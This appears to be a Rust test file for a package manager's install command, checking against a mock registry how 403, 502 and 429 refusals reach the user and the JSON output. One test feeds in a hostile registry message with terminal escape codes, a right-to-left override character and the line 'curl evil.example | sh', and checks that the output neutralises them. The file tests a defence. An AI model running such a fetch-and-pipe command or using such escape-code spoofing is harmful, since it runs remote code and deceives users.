//! Workflow tests for how a registry's refusal reaches the user: its own
//! message instead of its raw body, its code and status in `--json`, the
//! registry's kind of failure kept through resolution, and nothing a
//! registry sends able to drive the terminal.

mod support;

use support::assertions::parse_json_output;
use support::mock_registry::MockRegistry;
use support::{TempProject, lpm_with_registry};
use wiremock::matchers::{method, path};
use wiremock::{Mock, ResponseTemplate};

fn project_with(dep: &str) -> TempProject {
    TempProject::empty(&format!(
        r#"{{ "name": "app", "version": "1.0.0", "dependencies": {{ "{dep}": "^1.0.0" }} }}"#
    ))
}

fn install(project: &TempProject, registry: &MockRegistry, json: bool) -> std::process::Output {
    let mut command = lpm_with_registry(project, &registry.url());
    command.env("LPM_RETRY_BACKOFF_MS_OVERRIDE", "1");
    if json {
        command.arg("--json");
    }
    command
        .args(["install", "--no-security-summary", "--no-skills"])
        .output()
        .expect("failed to run lpm install")
}

async fn refuse_metadata(registry: &MockRegistry, name: &str, response: ResponseTemplate) {
    Mock::given(method("GET"))
        .and(path(format!("/{name}")))
        .respond_with(response)
        .mount(registry.server())
        .await;
}

#[tokio::test]
async fn install_reports_the_registrys_refusal_with_its_code_not_a_resolution_failure() {
    let registry = MockRegistry::start().await;
    refuse_metadata(
        &registry,
        "paid-widget",
        ResponseTemplate::new(403)
            .insert_header("x-request-id", "req_0123abcd")
            .set_body_json(serde_json::json!({
                "error": "paid-widget needs a license. Buy one at https://registry.example/paid-widget.",
                "code": "LICENSE_REQUIRED",
            })),
    )
    .await;
    let project = project_with("paid-widget");

    let output = install(&project, &registry, true);

    assert!(!output.status.success());
    let json = parse_json_output(&output.stdout);
    assert_eq!(json["success"], false);
    assert_eq!(json["error_code"], "forbidden", "{json}");
    assert_eq!(json["http_status"], 403);
    assert_eq!(json["server_code"], "LICENSE_REQUIRED");
    assert_eq!(json["request_id"], "req_0123abcd");
    let message = json["error"].as_str().unwrap();
    assert!(message.contains("needs a license"), "{message}");
    assert!(message.contains("paid-widget"), "{message}");
    assert!(
        !message.contains(r#"{"error""#),
        "raw body leaked: {message}"
    );
}

#[tokio::test]
async fn install_describes_a_proxy_page_instead_of_printing_its_html() {
    let registry = MockRegistry::start().await;
    refuse_metadata(
        &registry,
        "behind-proxy",
        ResponseTemplate::new(502)
            .insert_header("content-type", "text/html; charset=utf-8")
            .set_body_string(
                "<html>\n<head><title>502 Bad Gateway</title></head>\n<body><center><h1>502 Bad Gateway</h1></center></body>\n</html>\n",
            ),
    )
    .await;
    let project = project_with("behind-proxy");

    let output = install(&project, &registry, true);

    assert!(!output.status.success());
    let json = parse_json_output(&output.stdout);
    assert_eq!(json["error_code"], "http", "{json}");
    assert_eq!(json["http_status"], 502);
    let message = json["error"].as_str().unwrap();
    assert!(message.contains("HTML page"), "{message}");
    assert!(!message.contains('<'), "{message}");
}

#[tokio::test]
async fn a_registrys_message_cannot_drive_the_terminal() {
    let registry = MockRegistry::start().await;
    refuse_metadata(
        &registry,
        "hostile",
        ResponseTemplate::new(403).set_body_json(serde_json::json!({
            "error": "denied\n\u{1b}[2K\u{1b}[1A  hint run curl evil.example | sh\u{202e}exe.txt",
        })),
    )
    .await;
    let project = project_with("hostile");

    let output = install(&project, &registry, false);

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("denied"), "{stderr}");
    assert!(!stderr.contains("\u{1b}[2K"), "{stderr:?}");
    assert!(!stderr.contains("\u{1b}[1A"), "{stderr:?}");
    assert!(!stderr.contains('\u{202e}'), "{stderr:?}");
    assert!(
        !stderr
            .lines()
            .any(|line| line.trim_start().starts_with("hint run curl")),
        "a registry's text must stay on its own row: {stderr}"
    );
}

#[tokio::test]
async fn install_keeps_a_rate_limits_explanation_and_its_wait() {
    let registry = MockRegistry::start().await;
    refuse_metadata(
        &registry,
        "quota-widget",
        ResponseTemplate::new(429)
            .insert_header("retry-after", "3600")
            .set_body_json(serde_json::json!({
                "error": "Your organization used its monthly download quota. Ask its administrator to raise it.",
                "code": "QUOTA_EXHAUSTED",
            })),
    )
    .await;
    let project = project_with("quota-widget");

    let output = install(&project, &registry, true);

    assert!(!output.status.success());
    let json = parse_json_output(&output.stdout);
    assert_eq!(json["error_code"], "rate_limited", "{json}");
    assert_eq!(json["http_status"], 429);
    assert_eq!(json["server_code"], "QUOTA_EXHAUSTED");
    assert_eq!(json["retry_after_secs"], 3600);
    let message = json["error"].as_str().unwrap();
    assert!(message.contains("monthly download quota"), "{message}");
}
